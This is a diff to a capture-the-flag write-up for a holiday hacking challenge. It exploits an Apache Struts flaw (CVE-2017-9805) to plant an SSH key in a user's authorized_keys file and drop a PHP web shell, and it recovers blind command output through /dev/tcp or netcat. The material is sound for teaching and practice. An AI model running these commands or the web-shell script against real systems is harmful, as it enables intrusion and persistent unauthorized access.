@@ -148,7 +148,7 @@ Performing the same simple command above results in a lengthy Apache Tomcat
 error with no apparent output from our =ls= command. We're dealing with a
 blind injection so we'll need to figure out a different way to get the output
 of the command. One trick we can pull is redirecting output to a special
-pseudo device, =/dev/tcp/$host/$port=. First we'll need to set up a listener
+pseudo device, ~/dev/tcp/$host/$port~. First we'll need to set up a listener
 on our end first.
 
 #+BEGIN_SRC sh
@@ -191,7 +191,18 @@ drwxr-xr-x 2 root               www-data              4096 Oct 12 19:11 js
 -rwx------ 1 www-data           www-data               231 Oct 12 21:25 process.php
 #+END_SRC
 
-Oh look. There's [[https://l2s.northpolechristmastown.com/GreatBookPage2.pdf][GreatBookPage2.pdf]]. We can download it and find the answer to the first question. Now on to the second.
+Oh look. There's [[https://l2s.northpolechristmastown.com/GreatBookPage2.pdf][GreatBookPage2.pdf]]. We can download it and find the answer to the first question.
+
+Let's assume for a minute that we didn't know where the web root
+was. Since page 1 of our Great Book was a PDF, it's a pretty safe bet
+that page 2 is also a PDF. It takes about half of a second to search the system for all PDFs using =find=:
+
+#+BEGIN_SRC sh
+$ find / -name *.pdf
+/var/www/html/GreatBookPage2.pdf
+#+END_SRC
+
+Now on to the second.
 
 It looks like we found our web root. Let's try out the
 web shell they suggest in the hints from Josh Wright
@@ -252,10 +263,39 @@ The trick here is just finding the right file, and the password is in cleartext 
 
 *** Add an authorized_key
 
-One thing you can do if you don't have the password yet is actually add an ssh key to alabaster's authorized keys file. This is problematic since you need to know that the username is actually =alabaster_snowball= first. Assuming you do, you can run the following command to add your key to the file.
+One thing you can do if you don't have the password yet is actually
+add an ssh key to alabaster's authorized keys file. This is
+problematic since you need to know that the username is actually
+=alabaster_snowball= first. Assuming you do, you can run the following
+command to add your key to the file.
+
+The command we want to run is the following, taking care not to clobber any existing authorized keys:
 
 #+BEGIN_SRC sh
-./cve_2017_9805.py -u https://dev.northpolechristmastown.com/orders.xhtml -c "echo ssh-rsa VGhpcyBpcyBub3QgcmVhbGx5IGFuIFJTQSBrZXksIGJ1dCBoZXksIHdobyByZWFsbHkgbG9va3MgYXQgYmFzZTY0IGFueXdheQo= holiday@hack | tee -a /home/alabaster_snowball/.ssh/authorized_keys"
+cd /home/alabaster_snowball
+# Make the .ssh directory, if it doesn't exist
+mkdir .ssh
+# ssh is very picky about permissions, so lock this down:
+chmod 700 .ssh
+cd .ssh
+
+# Create the authorized_keys file, if it doesn't exist
+touch authorized_keys
+# ...and lock it down
+chmod 600 authorized_keys
+
+# Append our key
+echo ssh-rsa VGhpcyBpcyBub3QgcmVhbGx5IGFuIFJTQSBrZXksIGJ1dCBoZXksIHdobyByZWFsbHkgbG9va3MgYXQgYmFzZTY0IGFueXdheQo= holiday@hack | tee -a /home/alabaster_snowball/.ssh/authorized_keys
+#+END_SRC
+
+For running this via the Struts exploit, we want this all as a
+one-liner. Let's break this up into two parts: first, we'll create the
+necessary directory and file, and ensure the permissions are correct,
+then we'll add our key:
+
+#+BEGIN_SRC sh
+./cve_2017_9805.py -u https://dev.northpolechristmastown.com/orders.xhtml -c 'cd /home/alabaster_snowball; mkdir .ssh; chmod 700 .ssh; cd .ssh; touch authorized_keys; chmod 600 authorized_keys'
+./cve_2017_9805.py -u https://dev.northpolechristmastown.com/orders.xhtml -c 'echo ssh-rsa VGhpcyBpcyBub3QgcmVhbGx5IGFuIFJTQSBrZXksIGJ1dCBoZXksIHdobyByZWFsbHkgbG9va3MgYXQgYmFzZTY0IGFueXdheQo= holiday@hack | tee -a /home/alabaster_snowball/.ssh/authorized_keys'
 #+END_SRC
 
 Then you can ssh using your private key identity file.
@@ -271,9 +311,9 @@ Once in you are in a restricted shell but you can try to grep for alabaster's pa
 
 *** Automate the webshell
 
-We can automate dropping a webshell and creating a mini shell to query it. Assuming we have [[https://github.com/chrisjd20/cve-2017-9805.py]] in the same directory we can create a script to automate expoloitation and give us a prompt to execute commands.
+We can automate dropping a webshell and creating a mini shell to query it. Assuming we have [[https://github.com/chrisjd20/cve-2017-9805.py]] in the same directory we can create a script to automate exploitation and give us a prompt to execute commands.
 
-#+BEGIN_SRC sh
+#+BEGIN_SRC python
 #!/usr/bin/env python
 from __future__ import print_function
 
@@ -290,7 +330,8 @@ WEBSHELL_PAYLOAD = b'<?php system($_GET[cmd]); ?>\n'
 WEBSHELL_PAYLOAD_ENCODED = base64.encodestring(WEBSHELL_PAYLOAD).strip()
 
 ## Emulate this command:
-## /cve-2017-9805.py -c 'echo PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOyA/Pgo= | base64 -d > /var/www/html/4beadb1e-5ddb-4636-98a4-c2dac0f79ab0.php' -u https://dev.northpolechristmastown.com/orders.xhtml
+## /cve-2017-9805.py -c 'echo PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOyA/Pgo= | 
+##    base64 -d > /var/www/html/4beadb1e-5ddb-4636-98a4-c2dac0f79ab0.php' -u https://dev.northpolechristmastown.com/orders.xhtml
 EXPLOIT_COMMAND = "echo {} | base64 -d > /var/www/html/{}".format(WEBSHELL_PAYLOAD_ENCODED, WEBSHELL)
 
 def run_command(command):
@@ -378,7 +419,16 @@ www-data@l2s:$ find / -type f -xdev -user alabaster_snowball 2>/dev/null | xargs
    :CUSTOM_ID: common-pitfalls
    :END:
 
-A common pitfall is the blind injection aspect of the Apache Struts exploit.
+A common pitfall is the blind injection aspect of the Apache Struts exploit. There were a couple of ways around this:
+
+  * Using the ~/dev/tcp~ trick like we did,
+  * Redirect the output to =/var/www/html/$filename=, and then accessing that via the web interface,
+  * Piping the output to =netcat=.
+
+Finding the password was also tricky. Luckily, there weren't many
+files on this system, so we could just =grep= everything, but another
+option would've been to look for files that had been modified around
+the time the system was installed.
 
 ** About the Challenge
    :PROPERTIES:
@@ -390,7 +440,7 @@ Initially the host has a couple of noticeable holes.
   * Apache server running as alabaster (eventually changed to www-data user)
   * Easy bypass of rbash by adding the '-t' flag and executing bash on ssh login (eventually rbash was forced through sshd_config)
 
-The server itself housed two virtual web hosts, the Letter's to Santa application which ran PHP in nginx and the Development site which was run by apache struts on a high port being redirected by nginx.
+The server itself housed two virtual web hosts, the Letter's to Santa application which ran PHP in nginx and the Development site which was run by Apache struts on a high port being redirected by nginx.
 
 ** Moving Foward
 
